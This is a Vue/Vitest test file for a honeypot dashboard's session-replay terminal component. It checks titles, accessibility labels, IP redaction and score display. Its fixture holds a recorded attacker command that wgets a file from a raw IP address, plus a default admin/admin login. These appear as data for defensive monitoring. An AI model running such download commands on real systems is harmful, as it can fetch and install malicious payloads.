import { mount } from '@vue/test-utils'
import { describe, expect, it } from 'vitest'

import SessionTerminal from '@/components/sessions/SessionTerminal.vue'
import type { SessionDetailResponse } from '@/api/generated/types.gen'

function session(over: Partial<SessionDetailResponse> = {}): SessionDetailResponse {
  return {
    id: 's1',
    src_port: 1,
    dst_port: 2222,
    protocol: 'ssh',
    sensor: 'edge-01',
    interest: 0,
    max_interest: 0,
    country: 'United States',
    country_code: 'US',
    city: null,
    lat: null,
    lon: null,
    started_at: '2026-05-31T13:40:52+00:00',
    ended_at: '2026-05-31T13:41:50+00:00',
    auth_attempts: [
      {
        id: 1,
        username: 'admin',
        password: 'admin',
        success: true,
        timestamp: '2026-05-31T13:41:38+00:00',
      },
    ],
    commands: [
      {
        id: 10,
        input: 'wget http://34.11.136.102/x',
        success: true,
        timestamp: '2026-05-31T13:41:49+00:00',
      },
    ],
    downloads: [],
    ...over,
  }
}

describe('SessionTerminal', () => {
  it('shows a chrome title without any IP and renders the transcript', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    const title = w.find('.term-title').text()
    expect(title).toContain('honeypot')
    expect(title).toContain('SSH')
    expect(title).not.toContain('172.23.0.2')
    expect(w.find('.term-body').text()).toContain('admin@honeypot')
  })

  it('keeps the phone meta to one short line with the country as a flag', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    const meta = w.find('.term-meta')
    expect(meta.text()).not.toContain('United States')
    expect(meta.text()).not.toContain('honeypot')
    expect(meta.text()).toContain('2026-05-31 13:40:52 UTC')
    const flag = meta.get('.term-flag')
    expect(flag.attributes('aria-label')).toBe('United States')
    expect(flag.attributes('title')).toBe('United States')
  })

  it('shows the outcome pill as a glyph with its words as the accessible name', () => {
    const w = mount(SessionTerminal, {
      props: { session: session({ commands: [], auth_attempts: [] }) },
    })
    const chip = w.get('.term-tags [role="img"]')
    expect(chip.classes()).toContain('glyphed')
    expect(chip.attributes('aria-label')).toBeTruthy()
  })

  it('blots IPs that appear in command text', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    const body = w.find('.term-body').text()
    expect(body).not.toContain('34.11.136.102')
    expect(body).toContain('<ip>')
  })

  it('labels the terminal region for assistive tech', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    // Section element requires aria-label for implicit ARIA landmark.
    expect(w.find('section.terminal').attributes('aria-label')).toContain('Replay of the')
  })

  it('hides the replay note behind a ? button that Escape closes', async () => {
    const w = mount(SessionTerminal, { props: { session: session() }, attachTo: document.body })
    const btn = w.find('.note-btn')
    expect(w.find('#replay-note').exists()).toBe(false)
    expect(btn.attributes('aria-expanded')).toBe('false')
    await btn.trigger('click')
    expect(btn.attributes('aria-expanded')).toBe('true')
    expect(btn.attributes('aria-controls')).toBe('replay-note')
    expect(w.find('#replay-note').text()).toContain('Rebuilt from what the honeypot recorded')
    await btn.trigger('keydown', { key: 'Escape' })
    expect(w.find('#replay-note').exists()).toBe(false)
    expect(document.activeElement).toBe(btn.element)
    w.unmount()
  })

  it('shows the short session id and a muted line when nothing was typed', () => {
    const w = mount(SessionTerminal, {
      props: { session: session({ id: 'abcdef0123456789', auth_attempts: [], commands: [] }) },
    })
    expect(w.find('.term-tags .sid').text()).toBe('abcdef012345')
    expect(w.find('.term-empty').text()).toBe('Nothing typed in this session.')
  })

  it('omits the empty line when the attacker typed something', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    expect(w.find('.term-empty').exists()).toBe(false)
  })

  it('draws the score hex from the detail response, no list row needed', () => {
    const w = mount(SessionTerminal, {
      props: { session: session({ interest: 9, max_interest: 20 }) },
    })
    const hex = w.findComponent({ name: 'ScoreHex' })
    expect(hex.props()).toMatchObject({ interest: 9, ceiling: 20 })
  })

  it('draws no score hex when the dataset has no interest ceiling', () => {
    const w = mount(SessionTerminal, {
      props: { session: session({ interest: 0, max_interest: 0 }) },
    })
    expect(w.findComponent({ name: 'ScoreHex' }).exists()).toBe(false)
  })

  it('stamps the title with the UTC start to the second', () => {
    const w = mount(SessionTerminal, { props: { session: session() } })
    expect(w.find('.term-title').text()).toContain('2026-05-31 13:40:52 UTC')
  })

  it('omits the stamp, not the terminal, when the start time is unparseable', () => {
    const w = mount(SessionTerminal, { props: { session: session({ started_at: 'garbage' }) } })
    expect(w.find('.term-title').text()).not.toContain('UTC')
  })
})
